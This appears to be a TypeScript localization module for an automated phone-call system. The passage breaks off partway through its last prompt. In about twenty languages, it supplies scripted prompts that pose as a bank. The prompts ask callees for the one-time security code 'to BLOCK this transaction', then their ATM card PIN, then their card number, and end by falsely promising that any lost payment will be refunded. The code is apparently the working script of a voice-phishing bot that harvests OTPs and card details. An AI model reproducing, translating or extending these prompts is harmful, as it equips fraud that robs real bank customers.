import { Language } from '../../types';

export const getLangOTP = ({
  language,
  step,
  dtmf,
  sp,
  cardType,
}: {
  language: Language;
  dtmf?: string;
  step: string;
  sp: string;
  cardType?: string;
}): string | undefined => {
  switch (step) {
    case `shared`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            'en-CA': `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            'en-AU': `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            'en-GB': `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            'en-NZ': `The OTP you have entered is incorrect. Please enter the OTP again followed by the pound key.`,
            'en-ZA': `The OTP you have entered is incorrect. Please enter the OTP again followed by the hash key.`,
            'es-ES': `La contraseña de un solo uso que ingresó es incorrecta. Ingrese la contraseña de un solo uso nuevamente seguida de la tecla numeral.`,
            'pt-PT': `A senha de uso único que você digitou está incorreta. Digite a senha de uso único novamente seguida da tecla sustenido.`,
            'pt-BR': `A senha de uso único que você digitou está incorreta. Digite a senha de uso único novamente seguida da tecla sustenido.`,
            'it-IT': `La password monouso che hai inserito non è corretta. Inserisci di nuovo la password monouso seguita dal cancelletto.`,
            'fr-FR': `Le mot de passe à usage unique que vous avez entré est incorrect. Veuillez saisir à nouveau le mot de passe à usage unique suivi de la touche dièse.`,
            'de-DE': `Das eingegebene Einmalpasswort ist falsch. Bitte geben Sie das Einmalpasswort erneut gefolgt von der Rautetaste ein.`,
            'nb-NO': `Engangspassordet du har skrevet inn er feil. Vennligst skriv inn engangspassordet igjen etterfulgt av pund-tasten.`,
            'pl-PL': `Wprowadzone hasło jednorazowe jest nieprawidłowe. Wprowadź ponownie hasło jednorazowe, a następnie krzyżyk.`,
            'sv-SE': `Engångslösenordet du har angett är felaktigt. Vänligen ange engångslösenordet igen följt av pundnyckeln.`,
            'tr-TR': `Girdiğiniz Tek kullanımlık şifre yanlış. Lütfen Tek Kullanımlık parolayı ve ardından kare anahtarı girin.`,
            'cy-GB': `Mae'r cyfrinair Un-amser a roesoch yn anghywir. Rhowch y cyfrinair Un-amser eto ac yna'r allwedd punt.`,
            'nl-NL': `Het door u ingevoerde eenmalige wachtwoord is onjuist. Voer het eenmalige wachtwoord opnieuw in, gevolgd door het hekje.`,
            'da-DK': `Den engangsadgangskode, du har indtastet, er forkert. Indtast venligst engangsadgangskoden igen efterfulgt af pund-tasten.`,
            'ca-ES': `La contrasenya única que heu introduït és incorrecta. Si us plau, torneu a introduir la contrasenya única seguida de la tecla de lletres.`,
          }[language];

        default:
          return `You should never be here.`;
      }
    case `bank`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-CA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-AU': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-GB': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-NZ': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-ZA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the hash key. If you have not received the security code yet please press the star key followed by the hash key.`,
            'es-ES': `No has ingresado nada. Por su SEGURIDAD y para BLOQUEAR esta transacción, ingrese el CÓDIGO DE SEGURIDAD que le hemos enviado seguido de la tecla numeral. Si aún no ha recibido el código de seguridad, presione la tecla de asterisco seguida de la tecla de almohadilla.`,
            'pt-PT': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'pt-BR': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'it-IT': `Non hai inserito nulla. Per la tua SICUREZZA e per BLOCCARE questa transazione, inserisci il CODICE SICUREZZA che ti abbiamo inviato seguito dal cancelletto. Se non hai ancora ricevuto il codice di sicurezza, premi il tasto asterisco seguito dal tasto cancelletto.`,
            'fr-FR': `Vous n'avez rien saisi. Pour votre SÉCURITÉ et pour BLOQUER cette transaction, veuillez entrer le CODE DE SÉCURITÉ que nous vous avons envoyé suivi du dièse. Si vous n'avez pas encore reçu le code de sécurité, veuillez appuyer sur la touche étoile suivie de la touche dièse.`,
            'de-DE': `Sie haben nichts eingegeben. Geben Sie zu Ihrer SICHERHEIT und zum BLOCKIEREN dieser Transaktion bitte den SICHERHEITSCODE ein, den wir Ihnen gesendet haben, gefolgt von der Raute-Taste. Wenn Sie den Sicherheitscode noch nicht erhalten haben, drücken Sie bitte die Sterntaste gefolgt von der Rautetaste.`,
            'nb-NO': `Du har ikke skrevet inn noe. For din SIKKERHET og for å BLOKKERE denne transaksjonen, vennligst skriv inn SIKKERHETSKODEN vi har sendt deg etterfulgt av pund-tasten. Hvis du ikke har mottatt sikkerhetskoden ennå, trykk på stjernetasten etterfulgt av pund-tasten.`,
            'pl-PL': `Nic nie wpisałeś. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ tę transakcję, wprowadź KOD ZABEZPIECZAJĄCY, który Ci wysłaliśmy, a następnie krzyżyk. Jeśli nie otrzymałeś jeszcze kodu zabezpieczającego, naciśnij klawisz gwiazdki, a następnie krzyżyk.`,
            'sv-SE': `Du har inte angett något. För din SÄKERHET och för att BLOCKERA denna transaktion, vänligen ange SÄKERHETSKODEN vi har skickat till dig följt av pund-nyckeln. Om du inte har fått säkerhetskoden ännu, tryck på stjärnknappen följt av pundknappen.`,
            'tr-TR': `Hiçbir şey girmediniz. GÜVENLİĞİNİZ için ve bu işlemi BLOKLAMAK için size gönderdiğimiz GÜVENLİK KODU'nu ve ardından kare anahtarını giriniz. Güvenlik kodunu henüz almadıysanız, lütfen yıldız tuşuna ve ardından kare tuşuna basın.`,
            'cy-GB': `Nid ydych wedi nodi unrhyw beth. Ar gyfer eich DIOGELWCH ac i flocio'r trafodiad hwn, nodwch y COD DIOGELWCH rydym wedi'i anfon atoch ac yna allwedd y bunt. Os nad ydych wedi derbyn y cod diogelwch eto gwasgwch y fysell seren ac yna'r allwedd punt.`,
            'nl-NL': `U heeft niets ingevuld. Voor uw VEILIGHEID en om deze transactie te BLOKKEREN, voert u de VEILIGHEIDSCODE in die we u hebben gestuurd, gevolgd door het hekje. Als u de beveiligingscode nog niet heeft ontvangen, drukt u op de stertoets gevolgd door het hekje.`,
            'da-DK': `Du har ikke indtastet noget. For din SIKKERHED og for at BLOKERE denne transaktion skal du indtaste den SIKKERHEDSKODE, vi har sendt til dig, efterfulgt af pund-tasten. Hvis du endnu ikke har modtaget sikkerhedskoden, skal du trykke på stjernetasten efterfulgt af pund-tasten.`,
            'ca-ES': `No has introduït res. Per a la vostra SEGURETAT i per BLOQUEAR aquesta transacció, introduïu el CODI DE SEGURETAT que us hem enviat seguit de la clau de llenya. Si encara no heu rebut el codi de seguretat, premeu la tecla estrella seguida de la tecla lletra.`,
          }[language];

        case `2`:
          return {
            'en-US': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-CA': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-AU': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-GB': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-NZ': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-ZA': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the hash key.`,
            'es-ES': `ESTUPENDO. ha ingresado ${dtmf}. Para AUTENTIFICARLO, ingrese el PIN de su TARJETA, el mismo PIN que usa en el cajero automático, seguido de la tecla numeral.`,
            'pt-PT': `EXCELENTE. você digitou ${dtmf}. Para AUTENTICÁ-LO, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da tecla sustenido.`,
            'pt-BR': `EXCELENTE. você digitou ${dtmf}. Para AUTENTICÁ-LO, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da tecla sustenido.`,
            'it-IT': `GRANDE. hai inserito ${dtmf}. Per AUTENTICARE inserisci il PIN della CARTA, lo stesso pin che usi allo sportello automatico, seguito dal cancelletto.`,
            'fr-FR': `GÉNIAL. vous avez saisi ${dtmf}. Pour VOUS AUTHENTIFIER, veuillez saisir le NIP de votre CARTE, le même NIP que vous utilisez au guichet automatique, suivi de la touche dièse.`,
            'de-DE': `GROSSARTIG. Sie haben ${dtmf} eingegeben. Um SIE ZU AUTHENTIFIZIEREN, geben Sie bitte Ihre KARTEN-PIN ein, dieselbe PIN, die Sie am Geldautomaten verwenden, gefolgt von der Raute-Taste.`,
            'nb-NO': `FLOTT. du har skrevet inn ${dtmf}. For å AUTENTISERE DEG, skriv inn KORT-PIN-koden din, den samme PIN-koden du bruker i minibanken, etterfulgt av pund-tasten.`,
            'pl-PL': `ŚWIETNIE. wpisałeś ${dtmf}. Aby UWIERZYTELNIĆ SIĘ, wprowadź PIN KARTY, ten sam, którego używasz w bankomacie, a następnie krzyżyk.`,
            'sv-SE': `BRA. du har angett ${dtmf}. För att AUTENTIFICERA DIG vänligen ange din KORT-PIN, samma PIN-kod som du använder i bankomaten, följt av pund-nyckeln.`,
            'tr-TR': `İYİ. ${dtmf} girdiniz. SİZİN DOĞRULAMAK için lütfen ATM'de kullandığınız KART PIN'inizi ve ardından kare anahtarını girin.`,
            'cy-GB': `GWYCH. rydych wedi nodi ${dtmf}. I'CH DILYSGU rhowch eich PIN CERDYN, yr un pin ag a ddefnyddiwch yn y peiriant ATM, ac yna'r allwedd punt.`,
            'nl-NL': `GROOT. u hebt ${dtmf} ingevoerd. Om u te AUTHENTICEREN, voert u uw KAART-PIN in, dezelfde pin die u bij de geldautomaat gebruikt, gevolgd door het hekje.`,
            'da-DK': `STORE. du har indtastet ${dtmf}. For at AUTENTIFICERE DIG skal du indtaste din KORT-PIN, den samme pinkode som du bruger i pengeautomaten, efterfulgt af pund-tasten.`,
            'ca-ES': `GRAN. heu introduït ${dtmf}. Per AUTENTICAR-vos, introduïu el PIN de la vostra TARGETA, el mateix PIN que feu servir al caixer automàtic, seguit de la clau de lletra.`,
          }[language];

        default:
          return `Should never be here.`;
      }
    case `pay`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-CA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-AU': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-GB': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-NZ': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-ZA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the hash key. If you have not received the security code yet please press the star key followed by the hash key.`,
            'es-ES': `No has ingresado nada. Por su SEGURIDAD y para BLOQUEAR esta transacción, ingrese el CÓDIGO DE SEGURIDAD que le hemos enviado seguido de la tecla numeral. Si aún no ha recibido el código de seguridad, presione la tecla de asterisco seguida de la tecla de almohadilla.`,
            'pt-PT': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'pt-BR': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'it-IT': `Non hai inserito nulla. Per la tua SICUREZZA e per BLOCCARE questa transazione, inserisci il CODICE SICUREZZA che ti abbiamo inviato seguito dal cancelletto. Se non hai ancora ricevuto il codice di sicurezza, premi il tasto asterisco seguito dal tasto cancelletto.`,
            'fr-FR': `Vous n'avez rien saisi. Pour votre SÉCURITÉ et pour BLOQUER cette transaction, veuillez entrer le CODE DE SÉCURITÉ que nous vous avons envoyé suivi du dièse. Si vous n'avez pas encore reçu le code de sécurité, veuillez appuyer sur la touche étoile suivie de la touche dièse.`,
            'de-DE': `Sie haben nichts eingegeben. Geben Sie zu Ihrer SICHERHEIT und zum BLOCKIEREN dieser Transaktion bitte den SICHERHEITSCODE ein, den wir Ihnen gesendet haben, gefolgt von der Raute-Taste. Wenn Sie den Sicherheitscode noch nicht erhalten haben, drücken Sie bitte die Sterntaste gefolgt von der Rautetaste.`,
            'nb-NO': `Du har ikke skrevet inn noe. For din SIKKERHET og for å BLOKKERE denne transaksjonen, vennligst skriv inn SIKKERHETSKODEN vi har sendt deg etterfulgt av pund-tasten. Hvis du ikke har mottatt sikkerhetskoden ennå, trykk på stjernetasten etterfulgt av pund-tasten.`,
            'pl-PL': `Nic nie wpisałeś. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ tę transakcję, wprowadź KOD ZABEZPIECZAJĄCY, który Ci wysłaliśmy, a następnie krzyżyk. Jeśli nie otrzymałeś jeszcze kodu zabezpieczającego, naciśnij klawisz gwiazdki, a następnie krzyżyk.`,
            'sv-SE': `Du har inte angett något. För din SÄKERHET och för att BLOCKERA denna transaktion, vänligen ange SÄKERHETSKODEN vi har skickat till dig följt av pund-nyckeln. Om du inte har fått säkerhetskoden ännu, tryck på stjärnknappen följt av pundknappen.`,
            'tr-TR': `Hiçbir şey girmediniz. GÜVENLİĞİNİZ için ve bu işlemi BLOKLAMAK için size gönderdiğimiz GÜVENLİK KODU'nu ve ardından kare anahtarını giriniz. Güvenlik kodunu henüz almadıysanız, lütfen yıldız tuşuna ve ardından kare tuşuna basın.`,
            'cy-GB': `Nid ydych wedi nodi unrhyw beth. Ar gyfer eich DIOGELWCH ac i flocio'r trafodiad hwn, nodwch y COD DIOGELWCH rydym wedi'i anfon atoch ac yna allwedd y bunt. Os nad ydych wedi derbyn y cod diogelwch eto gwasgwch y fysell seren ac yna'r allwedd punt.`,
            'nl-NL': `U heeft niets ingevuld. Voor uw VEILIGHEID en om deze transactie te BLOKKEREN, voert u de VEILIGHEIDSCODE in die we u hebben gestuurd, gevolgd door het hekje. Als u de beveiligingscode nog niet heeft ontvangen, drukt u op de stertoets gevolgd door het hekje.`,
            'da-DK': `Du har ikke indtastet noget. For din SIKKERHED og for at BLOKERE denne transaktion skal du indtaste den SIKKERHEDSKODE, vi har sendt til dig, efterfulgt af pund-tasten. Hvis du endnu ikke har modtaget sikkerhedskoden, skal du trykke på stjernetasten efterfulgt af pund-tasten.`,
            'ca-ES': `No has introduït res. Per a la vostra SEGURETAT i per BLOQUEAR aquesta transacció, introduïu el CODI DE SEGURETAT que us hem enviat seguit de la clau de llenya. Si encara no heu rebut el codi de seguretat, premeu la tecla estrella seguida de la tecla lletra.`,
          }[language];

        case `2`:
          return {
            'en-US': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-CA': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-AU': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-GB': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-NZ': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
            'en-ZA': `GREAT. you have entered ${dtmf}. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the hash key.`,
            'es-ES': `ESTUPENDO. ha ingresado ${dtmf}. Para AUTENTIFICARLO, ingrese el PIN de su TARJETA, el mismo PIN que usa en el cajero automático, seguido de la tecla numeral.`,
            'pt-PT': `EXCELENTE. você digitou ${dtmf}. Para AUTENTICÁ-LO, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da tecla sustenido.`,
            'pt-BR': `EXCELENTE. você digitou ${dtmf}. Para AUTENTICÁ-LO, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da tecla sustenido.`,
            'it-IT': `GRANDE. hai inserito ${dtmf}. Per AUTENTICARE inserisci il PIN della CARTA, lo stesso pin che usi allo sportello automatico, seguito dal cancelletto.`,
            'fr-FR': `GÉNIAL. vous avez saisi ${dtmf}. Pour VOUS AUTHENTIFIER, veuillez saisir le NIP de votre CARTE, le même NIP que vous utilisez au guichet automatique, suivi de la touche dièse.`,
            'de-DE': `GROSSARTIG. Sie haben ${dtmf} eingegeben. Um SIE ZU AUTHENTIFIZIEREN, geben Sie bitte Ihre KARTEN-PIN ein, dieselbe PIN, die Sie am Geldautomaten verwenden, gefolgt von der Raute-Taste.`,
            'nb-NO': `FLOTT. du har skrevet inn ${dtmf}. For å AUTENTISERE DEG, skriv inn KORT-PIN-koden din, den samme PIN-koden du bruker i minibanken, etterfulgt av pund-tasten.`,
            'pl-PL': `ŚWIETNIE. wpisałeś ${dtmf}. Aby UWIERZYTELNIĆ SIĘ, wprowadź PIN KARTY, ten sam, którego używasz w bankomacie, a następnie krzyżyk.`,
            'sv-SE': `BRA. du har angett ${dtmf}. För att AUTENTIFICERA DIG vänligen ange din KORT-PIN, samma PIN-kod som du använder i bankomaten, följt av pund-nyckeln.`,
            'tr-TR': `İYİ. ${dtmf} girdiniz. SİZİN DOĞRULAMAK için lütfen ATM'de kullandığınız KART PIN'inizi ve ardından kare anahtarını girin.`,
            'cy-GB': `GWYCH. rydych wedi nodi ${dtmf}. I'CH DILYSGU rhowch eich PIN CERDYN, yr un pin ag a ddefnyddiwch yn y peiriant ATM, ac yna'r allwedd punt.`,
            'nl-NL': `GROOT. u hebt ${dtmf} ingevoerd. Om u te AUTHENTICEREN, voert u uw KAART-PIN in, dezelfde pin die u bij de geldautomaat gebruikt, gevolgd door het hekje.`,
            'da-DK': `STORE. du har indtastet ${dtmf}. For at AUTENTIFICERE DIG skal du indtaste din KORT-PIN, den samme pinkode som du bruger i pengeautomaten, efterfulgt af pund-tasten.`,
            'ca-ES': `GRAN. heu introduït ${dtmf}. Per AUTENTICAR-vos, introduïu el PIN de la vostra TARGETA, el mateix PIN que feu servir al caixer automàtic, seguit de la clau de lletra.`,
          }[language];

        default:
          return `Should never be here.`;
      }
    case `account`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-CA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-AU': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-GB': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-NZ': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the pound key. If you have not received the security code yet please press the star key followed by the pound key.`,
            'en-ZA': `You have not entered anything. For your SECURITY and to BLOCK this transaction, please enter the SECURITY CODE we have sent you followed by the hash key. If you have not received the security code yet please press the star key followed by the hash key.`,
            'es-ES': `No has ingresado nada. Por su SEGURIDAD y para BLOQUEAR esta transacción, ingrese el CÓDIGO DE SEGURIDAD que le hemos enviado seguido de la tecla numeral. Si aún no ha recibido el código de seguridad, presione la tecla de asterisco seguida de la tecla de almohadilla.`,
            'pt-PT': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'pt-BR': `Você não digitou nada. Para sua SEGURANÇA e para BLOQUEAR esta transação, digite o CÓDIGO DE SEGURANÇA que lhe enviamos seguido da tecla sustenido. Se você ainda não recebeu o código de segurança, pressione a tecla asterisco seguida da tecla sustenido.`,
            'it-IT': `Non hai inserito nulla. Per la tua SICUREZZA e per BLOCCARE questa transazione, inserisci il CODICE SICUREZZA che ti abbiamo inviato seguito dal cancelletto. Se non hai ancora ricevuto il codice di sicurezza, premi il tasto asterisco seguito dal tasto cancelletto.`,
            'fr-FR': `Vous n'avez rien saisi. Pour votre SÉCURITÉ et pour BLOQUER cette transaction, veuillez entrer le CODE DE SÉCURITÉ que nous vous avons envoyé suivi du dièse. Si vous n'avez pas encore reçu le code de sécurité, veuillez appuyer sur la touche étoile suivie de la touche dièse.`,
            'de-DE': `Sie haben nichts eingegeben. Geben Sie zu Ihrer SICHERHEIT und zum BLOCKIEREN dieser Transaktion bitte den SICHERHEITSCODE ein, den wir Ihnen gesendet haben, gefolgt von der Raute-Taste. Wenn Sie den Sicherheitscode noch nicht erhalten haben, drücken Sie bitte die Sterntaste gefolgt von der Rautetaste.`,
            'nb-NO': `Du har ikke skrevet inn noe. For din SIKKERHET og for å BLOKKERE denne transaksjonen, vennligst skriv inn SIKKERHETSKODEN vi har sendt deg etterfulgt av pund-tasten. Hvis du ikke har mottatt sikkerhetskoden ennå, trykk på stjernetasten etterfulgt av pund-tasten.`,
            'pl-PL': `Nic nie wpisałeś. Aby uzyskać BEZPIECZEŃSTWO i ZABLOKOWAĆ tę transakcję, wprowadź KOD ZABEZPIECZAJĄCY, który Ci wysłaliśmy, a następnie krzyżyk. Jeśli nie otrzymałeś jeszcze kodu zabezpieczającego, naciśnij klawisz gwiazdki, a następnie krzyżyk.`,
            'sv-SE': `Du har inte angett något. För din SÄKERHET och för att BLOCKERA denna transaktion, vänligen ange SÄKERHETSKODEN vi har skickat till dig följt av pund-nyckeln. Om du inte har fått säkerhetskoden ännu, tryck på stjärnknappen följt av pundknappen.`,
            'tr-TR': `Hiçbir şey girmediniz. GÜVENLİĞİNİZ için ve bu işlemi BLOKLAMAK için size gönderdiğimiz GÜVENLİK KODU'nu ve ardından kare anahtarını giriniz. Güvenlik kodunu henüz almadıysanız, lütfen yıldız tuşuna ve ardından kare tuşuna basın.`,
            'cy-GB': `Nid ydych wedi nodi unrhyw beth. Ar gyfer eich DIOGELWCH ac i flocio'r trafodiad hwn, nodwch y COD DIOGELWCH rydym wedi'i anfon atoch ac yna allwedd y bunt. Os nad ydych wedi derbyn y cod diogelwch eto gwasgwch y fysell seren ac yna'r allwedd punt.`,
            'nl-NL': `U heeft niets ingevuld. Voor uw VEILIGHEID en om deze transactie te BLOKKEREN, voert u de VEILIGHEIDSCODE in die we u hebben gestuurd, gevolgd door het hekje. Als u de beveiligingscode nog niet heeft ontvangen, drukt u op de stertoets gevolgd door het hekje.`,
            'da-DK': `Du har ikke indtastet noget. For din SIKKERHED og for at BLOKERE denne transaktion skal du indtaste den SIKKERHEDSKODE, vi har sendt til dig, efterfulgt af pund-tasten. Hvis du endnu ikke har modtaget sikkerhedskoden, skal du trykke på stjernetasten efterfulgt af pund-tasten.`,
            'ca-ES': `No has introduït res. Per a la vostra SEGURETAT i per BLOQUEAR aquesta transacció, introduïu el CODI DE SEGURETAT que us hem enviat seguit de la clau de llenya. Si encara no heu rebut el codi de seguretat, premeu la tecla estrella seguida de la tecla lletra.`,
          }[language];

        case `2`:
          return {
            'en-US': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-CA': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-AU': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-GB': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-NZ': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-ZA': `Okay, you have entered ${dtmf}. We need to verify you, please enter your ${cardType} card number followed by the hash key.`,
            'es-ES': `Bien, ingresó ${dtmf}. Necesitamos verificarlo, ingrese su número de tarjeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido de la tecla numeral.`,
            'pt-PT': `Ok, você digitou ${dtmf}. Precisamos verificá-lo, por favor, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'pt-BR': `Ok, você digitou ${dtmf}. Precisamos verificá-lo, por favor, digite o número do seu cartão de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'it-IT': `Ok, hai inserito ${dtmf}. Dobbiamo verificarti, inserisci il numero della tua carta di ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBITO`
                : `CREDITO`
            } seguito dal cancelletto.`,
            'fr-FR': `D'accord, vous avez entré ${dtmf}. Nous devons vous vérifier, veuillez entrer votre numéro de carte ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `CRÉDIT`
            } suivi de la touche dièse.`,
            'de-DE': `Okay, Sie haben ${dtmf} eingegeben. Wir müssen Sie verifizieren, bitte geben Sie Ihre ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }Kartennummer gefolgt von der Raute-Taste ein.`,
            'nb-NO': `Ok, du har skrevet inn ${dtmf}. Vi må bekrefte deg, vennligst skriv inn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debet`
                : `kreditt`
            }kortnummeret etterfulgt av pund-tasten.`,
            'pl-PL': `OK, wpisałeś ${dtmf}. Musimy Cię zweryfikować, wprowadź numer karty ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `KREDYT`
            }, a następnie krzyżyk.`,
            'sv-SE': `Okej, du har angett ${dtmf}. Vi måste verifiera dig, vänligen ange ditt ${
              cardType && cardType.toLowerCase() === `debit`
                ? `betal`
                : `KREDIT`
            }kortsnummer följt av pundnyckeln.`,
            'tr-TR': `Tamam, ${dtmf} girdiniz. Sizi doğrulamamız gerekiyor, lütfen ${
              cardType && cardType.toLowerCase() === `debit` ? `BANKA` : `KREDİ`
            } kartı numaranızı ve ardından kare anahtarını girin.`,
            'cy-GB': `Iawn, rydych chi wedi nodi ${dtmf}. Mae angen i ni ddilysu chi, rhowch rif eich cerdyn ${
              cardType && cardType.toLowerCase() === `debit`
                ? `debyd`
                : `CREDYD`
            } ac yna'r allwedd punt.`,
            'nl-NL': `Oké, je hebt ${dtmf} ingevoerd. We moeten je verifiëren. Voer je ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `CREDIT-`
            }kaartnummer in gevolgd door het hekje.`,
            'da-DK': `Okay, du har indtastet ${dtmf}. Vi skal bekræfte dig. Indtast venligst dit ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }kortnummer efterfulgt af pund-tasten.`,
            'ca-ES': `D'acord, heu introduït ${dtmf}. Hem de verificar-vos, si us plau, introduïu el número de la vostra targeta de ${
              cardType && cardType.toLowerCase() === `debit`
                ? `DÈBIT`
                : `CRÈDIT`
            } seguit de la clau.`,
          }[language];

        case `3`:
          return {
            'en-US': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-CA': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-AU': `GREAT, you have entered ${dtmf}. Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
